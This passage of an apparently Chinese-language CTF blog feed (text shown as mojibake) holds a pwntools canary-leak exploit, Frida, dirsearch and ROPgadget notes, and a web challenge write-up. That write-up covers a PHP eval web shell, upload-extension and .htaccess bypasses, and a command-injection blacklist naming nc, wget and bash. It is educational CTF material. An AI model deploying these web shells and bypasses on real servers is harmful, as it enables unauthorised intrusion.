class="line"></span><br><span class="line">shell_addr = <span class="number">0x401262</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Give me some gift?&#x27;</span>,<span class="string">b&#x27;aaaaa%11$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;aaaaa&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;00&#x27;</span>).decode(),<span class="number">16</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x98</span>-<span class="number">0x70</span>) + p64(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span> + p64(shell_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Show me your magic&#x27;</span> , payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><img src="f71571a040bd1bfb5e48831796692882.png" alt="f71571a040bd1bfb5e48831796692882.png" /><img src="9e6b1f0ce6cc87c18d40d490fbac1cde.png" alt="9e6b1f0ce6cc87c18d40d490fbac1cde.png" />]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Fridaä½¿ç”¨</title>
      <link href="/ghsc_ovo_0721/Frida%E4%BD%BF%E7%94%A8/"/>
      <url>/ghsc_ovo_0721/Frida%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>frida æ˜¯ä¸€æ¬¾åŸºäº python+javascript çš„ hook æ¡†æ¶ï¼Œå¯è¿è¡Œåœ¨ androidã€iosã€linuxã€winç­‰å„ä¸ªå¹³å°ï¼Œä¸»è¦ä½¿ç”¨çš„åŠ¨æ€äºŒè¿›åˆ¶æ’æ¡©æŠ€æœ¯ã€‚</p><p>æˆ‘å®‰è£åœ¨win conda frida_env é‚£</p><p><a href="https://">https://mumu.163.com/help/20220721/35047_730476.html</a></p><img src="87116c7103ef679365debd9886ff7240.png" alt="87116c7103ef679365debd9886ff7240.png" /><p>E:\mumu\MuMuPlayer\nx_device\12.0\shell</p><p>adb connect 127.0.0.1:5555</p><p>E:\mumu\MuMuPlayer\nx_device\12.0\shell&gt;adb devices<br>List of devices attached<br>127.0.0.1:5555  device<br>emulator-5554   device</p><p>E:\mumu\MuMuPlayer\nx_device\12.0\shell&gt;adb -s 127.0.0.1:5555 shell getprop ro.product.cpu.abi<br>x86_64</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb -s 127.0.0.1:5555 push æœ¬åœ°æ–‡ä»¶ /sdcard/</span><br><span class="line">adb -s 127.0.0.1:5555 pull /sdcard/æ–‡ä»¶ æœ¬åœ°è·¯å¾„</span><br><span class="line">E:/BaiduNetdiskDownload/frida-server64/frida-server64 /sdcard/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">adb -s 127.0.0.1:5555 shell</span><br><span class="line">#1. è¿›å…¥ADB Shell</span><br><span class="line">su</span><br><span class="line">mv /sdcard/frida-server64 /data/local/tmp/</span><br><span class="line">chmod 755 /data/local/tmp/frida-server64</span><br><span class="line">ls -la /data/local/tmp/frida-server64</span><br><span class="line">cd /data/local/tmp</span><br><span class="line">./frida-server64 &amp;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ¯æ¬¡é‡å¯æ¨¡æ‹Ÿå™¨åéœ€è¦é‡æ–°è¿è¡Œ ./frida-server64 &amp;</span><br></pre></td></tr></table></figure><br/><h2 id="æˆ‘çš„å•Ÿå‹•"><a href="#æˆ‘çš„å•Ÿå‹•" class="headerlink" title="æˆ‘çš„å•Ÿå‹•"></a>æˆ‘çš„å•Ÿå‹•</h2><h3 id="ğŸ“‹-å‰ç½®æº–å‚™"><a href="#ğŸ“‹-å‰ç½®æº–å‚™" class="headerlink" title="ğŸ“‹ å‰ç½®æº–å‚™"></a>ğŸ“‹ å‰ç½®æº–å‚™</h3><ol><li>ç¢ºä¿MuMuæ¨¡æ“¬å™¨å·²é–‹å•Ÿ</li><li>ç¢ºèªADBå·¥å…·å¯ç”¨</li></ol><h3 id="ğŸ”„-é€£æ¥æ­¥é©Ÿ"><a href="#ğŸ”„-é€£æ¥æ­¥é©Ÿ" class="headerlink" title="ğŸ”„ é€£æ¥æ­¥é©Ÿ"></a>ğŸ”„ é€£æ¥æ­¥é©Ÿ</h3><p>æ­¥é©Ÿ1ï¼šé€£æ¥MuMuæ¨¡æ“¬å™¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd E:\mumu\MuMuPlayer\nx_device\12.0\shell</span><br><span class="line">adb connect 127.0.0.1:5555</span><br></pre></td></tr></table></figure><p>æ­¥é©Ÿ2ï¼šé€²å…¥ADB Shellä¸¦å•Ÿå‹•frida-server</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">adb -s 127.0.0.1:5555 shell</span><br><span class="line">su</span><br><span class="line">cd /data/local/tmp</span><br><span class="line">./frida-server64 &amp;</span><br></pre></td></tr></table></figure><p>æ­¥é©Ÿ3ï¼šé©—è­‰frida-serveré‹è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps | grep frida</span><br></pre></td></tr></table></figure><p>æ­¥é©Ÿ4ï¼šåœ¨æ–°CMDçª—å£æ¸¬è©¦Frida</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">conda activate frida_env</span><br><span class="line">frida-ps -U</span><br></pre></td></tr></table></figure><p>å¦‚æœç‰ˆæœ¬ä¸åŒ¹é…ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install frida==16.7.10</span><br><span class="line">pip install frida-tools==16.7.10</span><br></pre></td></tr></table></figure><h3 id="ğŸ¯-å¸¸ç”¨Fridaå‘½ä»¤"><a href="#ğŸ¯-å¸¸ç”¨Fridaå‘½ä»¤" class="headerlink" title="ğŸ¯ å¸¸ç”¨Fridaå‘½ä»¤"></a>ğŸ¯ å¸¸ç”¨Fridaå‘½ä»¤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">frida-ps -U                    # åˆ—å‡ºé€²ç¨‹</span><br><span class="line">frida-ps -Uai                  # åˆ—å‡ºå·²å®‰è£æ‡‰ç”¨</span><br><span class="line">frida -U -f com.example.app    # å•Ÿå‹•ä¸¦é™„åŠ æ‡‰ç”¨</span><br><span class="line">frida-ls-devices               # åˆ—å‡ºè¨­å‚™</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> RE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Frida </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dirsearchä½¿ç”¨</title>
      <link href="/ghsc_ovo_0721/dirsearch%E4%BD%BF%E7%94%A8/"/>
      <url>/ghsc_ovo_0721/dirsearch%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -e php,txt,zip -u https://target     //ç®€å•çš„æŸ¥çœ‹ç½‘å€ç›®å½•å’Œæ–‡ä»¶</span><br><span class="line"></span><br><span class="line">python3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt        //ä½¿ç”¨æ–‡ä»¶æ‹“å±•åä¸ºphp,txt,zipçš„å­—å…¸æ‰«æç›®æ ‡url</span><br><span class="line">python3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt --recursive -R 2</span><br><span class="line"></span><br><span class="line">python3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt --recursive -R 4 --scan-subdirs=/,/wp-content/,/wp-admin/</span><br><span class="line"></span><br><span class="line">python3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt --exclude-texts=This,AndThat</span><br><span class="line"></span><br><span class="line">python3 dirsearch.py -e php,txt,zip -u https://target -w db/dicc.txt -H &quot;User-Agent: IE&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://xxxx        //æ—¥å¸¸ä½¿ç”¨</span><br><span class="line"></span><br><span class="line">python dirsearch.py -u http://xxxx -r        //é€’å½’æ‰«æï¼Œä¸è¿‡å®¹æ˜“è¢«æ£€æµ‹</span><br><span class="line"></span><br><span class="line">python dirsearch.py -u http://xxxx -r -t 30        //çº¿ç¨‹æ§åˆ¶è¯·æ±‚é€Ÿç‡</span><br><span class="line"></span><br><span class="line">python dirsearch.py -u http://xxxx -r -t 30 --proxy 127.0.0.1:8080        //ä½¿ç”¨ä»£ç†</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Dirsearch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ROPgadget ä½¿ç”¨</title>
      <link href="/ghsc_ovo_0721/ROPgadget%20%E4%BD%BF%E7%94%A8/"/>
      <url>/ghsc_ovo_0721/ROPgadget%20%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>å®‰è£:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python-capstone</span><br><span class="line"> </span><br><span class="line">git clone https://github.com/JonathanSalwan/ROPgadget.git</span><br><span class="line"> </span><br><span class="line">cd ROPgadget</span><br><span class="line"> </span><br><span class="line">sudo python3 setup.py install</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27;</span><br><span class="line">æŸ¥æ‰¾å¯å­˜å‚¨å¯„å­˜å™¨çš„ä»£ç </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop --string &quot;/bin/sh&quot;</span><br><span class="line">æŸ¥æ‰¾å­—ç¬¦ä¸²</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop  --only &#x27;int&#x27;</span><br><span class="line">æŸ¥æ‰¾æœ‰int 0x80çš„åœ°å€</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>(WEB)2025 SWPU-NSSCTF ç§‹å­£æ‹›æ–°å…¥é—¨è®­ç»ƒèµ› ak</title>
      <link href="/ghsc_ovo_0721/WEB-2025-SWPU-NSSCTF-%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E5%85%A5%E9%97%A8%E8%AE%AD%E7%BB%83%E8%B5%9B/"/>
      <url>/ghsc_ovo_0721/WEB-2025-SWPU-NSSCTF-%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E5%85%A5%E9%97%A8%E8%AE%AD%E7%BB%83%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="2025-SWPU-NSSCTF-ç§‹å­£æ‹›æ–°å…¥é—¨è®­ç»ƒèµ›"><a href="#2025-SWPU-NSSCTF-ç§‹å­£æ‹›æ–°å…¥é—¨è®­ç»ƒèµ›" class="headerlink" title="2025 SWPU-NSSCTF ç§‹å­£æ‹›æ–°å…¥é—¨è®­ç»ƒèµ›"></a><strong>2025 SWPU-NSSCTF ç§‹å­£æ‹›æ–°å…¥é—¨è®­ç»ƒèµ›</strong></h1><p>ä½œè€…ï¼šghsc</p><h2 id="1-gift-F12"><a href="#1-gift-F12" class="headerlink" title="1.gift_F12"></a>1.gift_F12</h2><p>ç°½åˆ°é¡Œ!!!! æŒ‰F12</p><img src="ea1d840fdce1643f0679f8441d42a454.png" alt="ea1d840fdce1643f0679f8441d42a454.png" /><p>æŠŠWLLMCTFæ›æˆNSSCTFæäº¤ </p><h2 id="2-Do-you-know-http"><a href="#2-Do-you-know-http" class="headerlink" title="2.Do_you_know_http"></a>2.Do_you_know_http</h2><img src="15a6aa5a5d627d7c6c6af2cbf3a3580c.png" alt="15a6aa5a5d627d7c6c6af2cbf3a3580c.png" /><p>è¦ç”¨bpæŠ“åŒ… , å¯ä»¥çœ‹åˆ°å‡ºç¾äº† Please use â€˜WLLMâ€™ browser! åœ¨bpä¸Šé–‹å•ŸRepeater , ç„¶å¾ŒæŠŠåŒ…ä¸­çš„Uesr-Agent æ–¹å¼æ”¹æˆWLLM</p><img src="a087106c7ae1afb280efa8de4e9bda56.png" alt="a087106c7ae1afb280efa8de4e9bda56.png" /><p>Sendå¾Œæœå‹™å™¨è¿”å›äº†.&#x2F;a.php , å¯ä»¥æŠŠ&#x2F;hello.php æ”¹æˆa.php å†Send </p><img src="8ada2a790db134c7885a3af35606f208.png" alt="8ada2a790db134c7885a3af35606f208.png" /><p>è¦åœ¨æœ¬åœ°æ‰å¯ä»¥read  , æ‰€ä»¥åœ¨åŒ…ä¸­åŠ å…¥ X-Forwarded-For:127.0.0.1</p><img src="93bfd15a54a6d67530a5982cd73dc321.png" alt="93bfd15a54a6d67530a5982cd73dc321.png" /><p>è¿”å›äº†ä¸€å€‹&#x2F;secretttt.php , å†ä¾†æŠŠa.php æ”¹æˆ secretttt.php ,å¾—å‡ºflag </p><img src="1c642baa4c8ccf941b8062e36b97b514.png" alt="1c642baa4c8ccf941b8062e36b97b514.png" /><h2 id="3-WebFTP"><a href="#3-WebFTP" class="headerlink" title="3.WebFTP"></a>3.WebFTP</h2><img src="311fa37e164eb8b923532fe5b20faca2.png" alt="311fa37e164eb8b923532fe5b20faca2.png" /><p>ä½¿ç”¨kali ä¸­çš„dirsearch æ‰«æ , åœ¨kali ä¸­æ‰“å…¥ </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch python.py -u http://node7.anna.nssctf.cn:29562/?m=login&amp;a=in</span><br></pre></td></tr></table></figure><img src="9a10db4e14ad10f73bf3f6772c0f6ef6.png" alt="9a10db4e14ad10f73bf3f6772c0f6ef6.png" /><p>å­˜åœ¨gitæ³„éœ² , ä½¿ç”¨GitHack ä¸‹è¼‰å…‹éš†ç›®å½•</p><img src="01adb43f1c64d8cfb3d9d1ba1fe3d795.png" alt="01adb43f1c64d8cfb3d9d1ba1fe3d795.png" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 GitHack.py http://node7.anna.nssctf.cn:29562/?m=login&amp;a=in/.git</span><br></pre></td></tr></table></figure><img src="05b1101fe54144c815914cdf75f0c960.png" alt="05b1101fe54144c815914cdf75f0c960.png" /><p>ç©ºä»“åº“ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p><img src="84fe613a7014ffd37f31a06bb249307f.png" alt="84fe613a7014ffd37f31a06bb249307f.png" /><p>æœ€å¾Œåœ¨phpinfo.phpä¸­æ‰¾åˆ°äº†flag ã€‚ã€‚</p><img src="a1d0e26387232549f1c999611ef7a649.png" alt="a1d0e26387232549f1c999611ef7a649.png" /><h2 id="4-jicao"><a href="#4-jicao" class="headerlink" title="4.jicao"></a>4.jicao</h2><p>è¿™é“é¢˜æ˜¯ä¸€ä¸ªphpä»£ç å®¡è®¡é¢˜ç›®</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="title function_">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="title function_">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">$id=$_POST[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">$json=<span class="title function_">json_decode</span>($_GET[<span class="string">&#x27;json&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span> ($id==<span class="string">&quot;wllmNB&quot;</span>&amp;&amp;$json[<span class="string">&#x27;x&#x27;</span>]==<span class="string">&quot;wllm&quot;</span>)</span><br><span class="line">&#123;echo $flag;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨HackBar , POST  æ–¹æ³•æ˜¯ id &#x3D; wllmNB , GET æ–¹æ³•æ˜¯ json &#x3D; {â€œxâ€:â€wllmâ€}  (é€™æ˜¯json çš„GETæ–¹å¼)</p><img src="8eb0cc113238d50d6b4d6f73a89095f8.png" alt="8eb0cc113238d50d6b4d6f73a89095f8.png" /><br/><h2 id="5-easyupload1-0"><a href="#5-easyupload1-0" class="headerlink" title="5.easyupload1.0"></a>5.easyupload1.0</h2><img src="3c3df1f679fa27534846b37c7c7b74c9.png" alt="3c3df1f679fa27534846b37c7c7b74c9.png" /><p>æŠŠä¸€å¥è©±æœ¨é¦¬upload ä¸Šå» , ç„¶å¾Œç”¨BPæ””ä¸‹åŒ…è½‰å»Repeater ..&#x2F;.</p><p>ä¸€å¥è©±æœ¨é¦¬:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">BM</span></span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt; @<span class="built_in">eval</span>($_POST[<span class="string">&#x27;bhxdn&#x27;</span>]); <span class="title function_">phpinfo</span>();&lt;/script&gt;</span><br></pre></td></tr></table></figure><img src="44222a75c8417886544b761b68f7f345.png" alt="44222a75c8417886544b761b68f7f345.png" /><p>æŠŠ filename ç”±jpg æ”¹æˆ php ç„¶å¾Œç™¼é€</p><img src="e78ca8c5602c8a8b4b58322e042c57ab.png" alt="e78ca8c5602c8a8b4b58322e042c57ab.png" /><p>ç™¼é€æˆåŠŸ ,  åœ¨.&#x2F;upload&#x2F;xiaoma.php ä¸‹ , å¯ä»¥çœ‹è¦‹æ˜¯è§¸ç™¼äº†æœ¨é¦¬çš„ </p><img src="c65d3a42a9304b40d43ff0a3e55c1bf6.png" alt="c65d3a42a9304b40d43ff0a3e55c1bf6.png" /><p>ç„¶å¾Œå¯ä»¥é–‹antsword add URL </p><img src="f8163c307de9b0d00ede75a327993126.png" alt="f8163c307de9b0d00ede75a327993126.png" /><p>å¯ä»¥å›åˆ°htmlä¸‹æ‰¾åˆ°flag </p><img src="f03d9d2819fbfc38b994b755f6b73674.png" alt="f03d9d2819fbfc38b994b755f6b73674.png" /><p>flag ç‚º????????? WLLMCTF{I_d0nt_w4nna_wak3up} ???????,è¨˜å¾—æŠŠå‰é ­æ”¹æˆ NSSCTF{â€¦} </p><p>å¯æ˜¯flagä¸æ­£ç¢ºã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚åœ¨æ ¹ç›®éŒ„éƒ½æ²’æœ‰</p><p>åœ¨æ ¹ç›®éŒ„ä¸‹æ‰“é–‹cmd  æ‰“ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printenv</span><br></pre></td></tr></table></figure><p>å°±æœ‰</p><img src="bce1b958ab13d6b3b5372cf0549a7e1d.png" alt="bce1b958ab13d6b3b5372cf0549a7e1d.png" /><p>åŸä¾†flagåœ¨é€™FLAG&#x3D;NSSCTF{58c4de5b-6a3f-4dbc-8332-16ad44d25a11}</p><h2 id="6-easyupload2-0"><a href="#6-easyupload2-0" class="headerlink" title="6.easyupload2.0"></a>6.easyupload2.0</h2><p>é€™ä¸€æ¬¡çš„éæ¿¾æ˜¯åœ¨å¾Œå°çš„,æ‰€ä»¥æˆ‘è¦æƒ³è¾¦æ³•å»åšä¸€å€‹phpå¾Œç¶´ç¹é, æˆ‘ç”¨äº†deepseekå¯«äº†ä¸€å€‹å­—å…¸</p><img src="a15c6720f893ee3fb529a4d60f902821.png" alt="a15c6720f893ee3fb529a4d60f902821.png" /><p>,å…ˆå»æŠ“åŒ…é€å»Intruder</p><img src="7caeb4abdc3ba54e9a49950c3d72e9a2.png" alt="7caeb4abdc3ba54e9a49950c3d72e9a2.png" /><p>æŠŠJPG$ç‚ºpayload å¹¶æ’å…¥å­—å…¸,é–‹å§‹çˆ†ç ´ , çœ‹çœ‹Length 427 çš„Response  æ˜¯æˆåŠŸçš„ , é€²å»çœ‹çœ‹</p><img src="1dcc7c64b305fb28dfd58799daf0e827.png" alt="1dcc7c64b305fb28dfd58799daf0e827.png" /><p>æŸ¥ä¸€ä¸‹flagçš„ä½å­,å¾—å‡º flag : NSSCTF{9f5d5750-9a19-48c1-b41f-51d2db3e66a5}</p><img src="3bf6c15c0fc603e58634a61f1c81d911.png" alt="3bf6c15c0fc603e58634a61f1c81d911.png" /><h2 id="7-easyupload3-0"><a href="#7-easyupload3-0" class="headerlink" title="7.easyupload3.0"></a>7.easyupload3.0</h2><p>åˆ©ç”¨.htaccessè¿›è¡Œç»•è¿‡</p><p>.htaccess æ˜¯ä¸€ä¸ªç”¨äºé…ç½® Apache web æœåŠ¡å™¨çš„åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶ï¼Œå…¨ç§°ä¸º Hypertext Accessï¼ˆè¶…æ–‡æœ¬è®¿é—®ï¼‰ã€‚å®ƒå…è®¸ç½‘ç«™ç®¡ç†å‘˜åœ¨ä¸ä¿®æ”¹æœåŠ¡å™¨ä¸»é…ç½®æ–‡ä»¶ï¼ˆå¦‚ httpd.confï¼‰çš„æƒ…å†µä¸‹ï¼Œå¯¹ç‰¹å®šç›®å½•åŠå…¶å­ç›®å½•çš„æœåŠ¡å™¨è¡Œä¸ºè¿›è¡Œè®¾ç½®ï¼Œå…·æœ‰çµæ´»æ€§é«˜ã€é’ˆå¯¹æ€§å¼ºçš„ç‰¹ç‚¹ã€‚<br>.htaccess çš„æ ¸å¿ƒä½œç”¨<br>.htaccess æ–‡ä»¶ä¸»è¦ç”¨äºè¦†ç›– Apache ä¸»é…ç½®ä¸­çš„é»˜è®¤è§„åˆ™ï¼Œå®ç°å¯¹ç›®å½•çº§åˆ«çš„ç²¾ç»†åŒ–æ§åˆ¶ï¼Œå¸¸è§åŠŸèƒ½åŒ…æ‹¬ï¼š</p><p>URL é‡å†™ï¼ˆå¦‚å°†åŠ¨æ€ URL è½¬æ¢ä¸ºé™æ€å‹å¥½çš„å½¢å¼ï¼‰ã€‚<br>è®¿é—®æ§åˆ¶ï¼ˆé™åˆ¶ç‰¹å®š IP æˆ–ç”¨æˆ·è®¿é—®ï¼‰ã€‚<br>è‡ªå®šä¹‰é”™è¯¯é¡µé¢ï¼ˆå¦‚ 404ã€500 é”™è¯¯é¡µï¼‰ã€‚<br>ç¼“å­˜è®¾ç½®ï¼ˆæ§åˆ¶æµè§ˆå™¨æˆ–æœåŠ¡å™¨ç¼“å­˜ç­–ç•¥ï¼‰ã€‚<br>å®ç° HTTPS å¼ºåˆ¶è·³è½¬ã€‚<br>æ–‡ä»¶ç±»å‹å…³è”ï¼ˆå¦‚è®¾ç½®ç‰¹å®šæ‰©å±•åçš„ MIME ç±»å‹ï¼‰ç­‰ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">FilesMatch</span> <span class="string">&quot;xiaoma.jpg&quot;</span>&gt;</span><br><span class="line"><span class="title class_">SetHandler</span> application/x-httpd-php</span><br><span class="line">&lt;/<span class="title class_">FilesMatch</span>&gt;</span><br><span class="line"></span><br><span class="line"># <span class="title class_">SetHandler</span> æŒ‡ä»¤å¼ºåˆ¶æŒ‡å®šæ–‡ä»¶çš„å¤„ç†ç¨‹åº</span><br><span class="line"># è¿™é‡Œå°† <span class="string">&quot;xiaoma.jpg&quot;</span> äº¤ç»™ <span class="variable constant_">PHP</span> å¤„ç†å™¨ï¼ˆapplication/x-httpd-phpï¼‰å¤„ç†</span><br><span class="line"># å³æœåŠ¡å™¨ä¼šæŠŠè¿™ä¸ªå›¾ç‰‡æ–‡ä»¶å½“ä½œ <span class="variable constant_">PHP</span> è„šæœ¬æ‰§è¡Œï¼Œè€Œéç›´æ¥è¿”å›å›¾ç‰‡å†…å®¹</span><br></pre></td></tr></table></figure><p>å…ˆæŠ“å€‹åŒ…å…ˆ , ä¸Šå‚³ä¸€å¥è©±æœ¨é¦¬.jpg </p><img src="d0945bcbaab0944101929114cf63e9fd.png" alt="d0945bcbaab0944101929114cf63e9fd.png" /><p>è©¦è©¦ç”¨çˆ†ç ´ä¸€ä¸‹</p><img src="cf2ed89b24dabe2d073d1d63eb2ea044.png" alt="cf2ed89b24dabe2d073d1d63eb2ea044.png" /><p>æœ€å¾Œåªæœ‰htaccessæˆåŠŸ , ç¾åœ¨å‚³å…¥.htaccess è…³æœ¬ </p><img src="730c04915892ed223f0bd9593c7b1554.png" alt="730c04915892ed223f0bd9593c7b1554.png" /><p>åœ¨&#x2F;upload çœ‹çœ‹ ã€‚</p><img src="1e867f19185207051fe9f6a1dd1c5845.png" alt="1e867f19185207051fe9f6a1dd1c5845.png" /><img src="24b764ecf857a0859dab633a4199f957.png" alt="24b764ecf857a0859dab633a4199f957.png" /><p>çš„ç¢ºæ˜¯åŸ·è¡Œäº†phpinfo.php</p><img src="5a6553d967a2946298da259ca46dc083.png" alt="5a6553d967a2946298da259ca46dc083.png" /><p>NSSCTF{6b9d4421-ffc6-4432-b2d8-9f4b8e88c96c}</p><br/><h2 id="8-finalrce"><a href="#8-finalrce" class="headerlink" title="8.finalrce"></a>8.finalrce</h2><br/><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="title function_">highlight_file</span>(__FILE__);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_">isset</span>($_GET[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $url=$_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_">preg_match</span>(<span class="string">&#x27;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\&quot;|\&gt;|\&lt;|\%|\$/i&#x27;</span>,$url))</span><br><span class="line">    &#123;</span><br><span class="line">        echo <span class="string">&quot;Sorry,you can&#x27;t use this.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        echo <span class="string">&quot;Can you see anything?&quot;</span>;</span><br><span class="line">        <span class="title function_">exec</span>($url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(1)é€™è£¡çš„ä»£ç¢¼èªªæ˜GET url ä¸èƒ½æ˜¯ â€œbash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|-|*|&quot;|&gt;|&lt;|%|$&#x2F;i â€œ </p><p>(2) exec() æ²’æœ‰å›é¡¯ , </p><pre><code> exec()</code></pre><p>åŸå‹ï¼šstring exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] )</p><p>è¯´æ˜ï¼š</p><p>ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œ $command æ˜¯è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œä¾‹å¦‚ï¼š â€œls 